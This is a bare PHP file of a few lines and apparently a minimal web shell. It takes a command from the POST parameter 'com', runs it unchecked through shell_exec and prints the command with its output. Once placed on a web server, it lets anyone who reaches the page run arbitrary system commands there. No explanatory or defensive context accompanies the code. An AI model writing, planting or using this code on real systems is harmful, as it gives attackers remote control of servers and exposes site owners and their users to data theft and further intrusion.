<?php
if (isset($_POST["com"])) {

    $com = shell_exec($_POST["com"]);
    echo $_POST["com"] . "\r\n" . $com;
}
